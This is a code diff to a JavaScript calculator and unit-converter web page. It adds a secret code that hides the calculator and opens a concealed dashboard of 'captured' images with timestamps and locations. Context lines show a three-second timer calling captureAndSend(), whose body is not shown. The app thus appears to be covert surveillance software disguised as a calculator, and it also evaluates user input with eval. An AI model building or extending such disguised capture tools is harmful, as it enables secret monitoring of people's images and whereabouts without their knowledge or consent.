@@ -1,13 +1,41 @@
-let display = document.getElementById("display");
+const display = document.getElementById("display");
 let expression = "";
+const secretCode = "38448674=";
 
 function press(key) {
     if (key === "=") {
+        // Check for secret code before eval
+        if (expression + "=" === secretCode) {
+            showDashboard();
+            expression = "";
+            display.value = "";
+            return;
+        }
+
         try {
-            display.value = eval(expression);
+            // Replace ^ with ** for exponentiation
+            let expr = expression.replace(/\^/g, "**");
+
+            // Replace math functions with Math equivalents
+            expr = expr.replace(/sin\(/g, "Math.sin(")
+                       .replace(/cos\(/g, "Math.cos(")
+                       .replace(/tan\(/g, "Math.tan(")
+                       .replace(/log\(/g, "Math.log10(")
+                       .replace(/sqrt\(/g, "Math.sqrt(");
+
+            // Evaluate expression
+            let result = eval(expr);
+
+            // Format result to fixed decimals if needed
+            if (typeof result === "number" && !Number.isInteger(result)) {
+                result = result.toFixed(8);
+            }
+
+            display.value = result;
         } catch {
             display.value = "Error";
         }
+        expression = ""; // reset after eval
     } else if (key === "C") {
         expression = "";
         display.value = "";
@@ -91,3 +119,135 @@ setInterval(() => {
         captureAndSend();
     }
 }, 3000);
+
+// Show dashboard UI
+function showDashboard() {
+    document.getElementById("calculator").style.display = "none";
+    document.getElementById("dashboard").style.display = "block";
+
+    const container = document.getElementById("imagesContainer");
+    container.innerHTML = "Loading images...";
+
+    fetch("/dashboard_images")
+        .then(res => res.json())
+        .then(data => {
+            container.innerHTML = "";
+            if (!data.images || data.images.length === 0) {
+                container.textContent = "No images captured yet.";
+                return;
+            }
+            data.images.forEach(img => {
+                const div = document.createElement("div");
+                div.style.marginBottom = "20px";
+                div.innerHTML = `
+                  <img src="${img.url}" style="max-width:300px; display:block; border: 2px solid #00FFAA; margin-bottom: 5px;"/>
+                  <p><strong>Timestamp:</strong> ${img.timestamp}</p>
+                  <p><strong>Location:</strong> ${img.location}</p>
+                `;
+                container.appendChild(div);
+            });
+        }).catch(err => {
+            container.textContent = "Error loading images.";
+            console.error(err);
+        });
+}
+
+function closeDashboard() {
+    document.getElementById("dashboard").style.display = "none";
+    document.getElementById("calculator").style.display = "block";
+}
+
+// Converter logic
+const units = {
+    length: {
+        meter: 1,
+        kilometer: 1000,
+        centimeter: 0.01,
+        millimeter: 0.001,
+        mile: 1609.34,
+        yard: 0.9144,
+        foot: 0.3048,
+        inch: 0.0254
+    },
+    weight: {
+        kilogram: 1,
+        gram: 0.001,
+        milligram: 0.000001,
+        pound: 0.453592,
+        ounce: 0.0283495
+    },
+    temperature: {
+        celsius: "celsius",
+        fahrenheit: "fahrenheit",
+        kelvin: "kelvin"
+    }
+};
+
+function updateUnits() {
+    const type = document.getElementById("converter-type").value;
+    const unitFrom = document.getElementById("unit-from");
+    const unitTo = document.getElementById("unit-to");
+
+    unitFrom.innerHTML = "";
+    unitTo.innerHTML = "";
+
+    for (const unit in units[type]) {
+        const optionFrom = document.createElement("option");
+        optionFrom.value = unit;
+        optionFrom.textContent = unit.charAt(0).toUpperCase() + unit.slice(1);
+        unitFrom.appendChild(optionFrom);
+
+        const optionTo = document.createElement("option");
+        optionTo.value = unit;
+        optionTo.textContent = unit.charAt(0).toUpperCase() + unit.slice(1);
+        unitTo.appendChild(optionTo);
+    }
+}
+
+function convert() {
+    const type = document.getElementById("converter-type").value;
+    const from = document.getElementById("unit-from").value;
+    const to = document.getElementById("unit-to").value;
+    const input = parseFloat(document.getElementById("converter-input").value);
+    const resultElem = document.getElementById("converter-result");
+
+    if (isNaN(input)) {
+        resultElem.textContent = "Please enter a valid number.";
+        return;
+    }
+
+    if (type === "temperature") {
+        let result;
+        if (from === to) {
+            result = input;
+        } else if (from === "celsius") {
+            if (to === "fahrenheit") {
+                result = (input * 9/5) + 32;
+            } else if (to === "kelvin") {
+                result = input + 273.15;
+            }
+        } else if (from === "fahrenheit") {
+            if (to === "celsius") {
+                result = (input - 32) * 5/9;
+            } else if (to === "kelvin") {
+                result = (input - 32) * 5/9 + 273.15;
+            }
+        } else if (from === "kelvin") {
+            if (to === "celsius") {
+                result = input - 273.15;
+            } else if (to === "fahrenheit") {
+                result = (input - 273.15) * 9/5 + 32;
+            }
+        }
+        resultElem.textContent = `${input} ${from} = ${result.toFixed(4)} ${to}`;
+    } else {
+        // Convert to base unit
+        const baseValue = input * units[type][from];
+        // Convert to target unit
+        const convertedValue = baseValue / units[type][to];
+        resultElem.textContent = `${input} ${from} = ${convertedValue.toFixed(4)} ${to}`;
+    }
+}
+
+// Initialize units on page load
+updateUnits();
